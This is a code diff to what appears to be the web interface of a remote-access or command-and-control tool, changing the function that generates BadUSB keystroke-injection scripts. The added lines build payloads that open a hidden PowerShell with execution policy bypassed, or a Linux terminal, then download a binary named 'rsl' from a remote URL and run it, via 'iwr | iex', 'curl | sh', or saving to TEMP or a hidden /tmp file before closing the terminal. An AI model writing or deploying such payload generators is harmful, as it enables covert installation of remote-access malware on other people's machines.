@@ -52,6 +52,7 @@ const app = state({
   badUsbOs: "linux",
   badUsbArch: "amd64",
   badUsbTags: "",
+  badUsbLoader: true,
   badUsbCopied: false,
 });
 
@@ -416,18 +417,27 @@ function badUsbShortUrl() {
 }
 
 function badUsbScript() {
-  const url = badUsbShortUrl();
+  const useLoader = app.badUsbLoader;
+  const url = useLoader ? badUsbShortUrl() : badUsbDownloadUrl();
   const os = app.badUsbOs || "linux";
   const lines = [];
   if (os === "windows" || os === "win") {
     lines.push("GUI r");
     lines.push("DELAY 500");
-    lines.push("STRING powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -c \"iwr '" + url + "' | iex\"");
+    if (useLoader) {
+      lines.push("STRING powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -c \"iwr '" + url + "' | iex\"");
+    } else {
+      lines.push(`STRING $r="${url}"; $o="$env:TEMP\\rsl.exe"; (New-Object Net.WebClient).DownloadFile($r,$o); Start-Process $o`);
+    }
     lines.push("ENTER");
   } else {
     lines.push("CTRL ALT t");
     lines.push("DELAY 800");
-    lines.push("STRING curl -sL '" + url + "' | sh &");
+    if (useLoader) {
+      lines.push("STRING curl -sL '" + url + "' | sh &");
+    } else {
+      lines.push("STRING curl -sL '" + url + "' -o /tmp/.rsl && chmod +x /tmp/.rsl && /tmp/.rsl &");
+    }
     lines.push("ENTER");
     lines.push("DELAY 200");
     lines.push("CTRL w");
@@ -712,6 +722,16 @@ const BadUsbModal = () =>
               value: () => app.badUsbTags,
               oninput: (e) => (app.badUsbTags = e.target.value),
             })
+          ),
+          el(
+            "label",
+            { class: "field checkbox" },
+            el("input", {
+              type: "checkbox",
+              checked: () => app.badUsbLoader,
+              onchange: (e) => (app.badUsbLoader = e.target.checked),
+            }),
+            el("span", {}, "Use bootstrap loader (shorter payload, downloads binary at runtime)")
           ),
           el(
             "div",
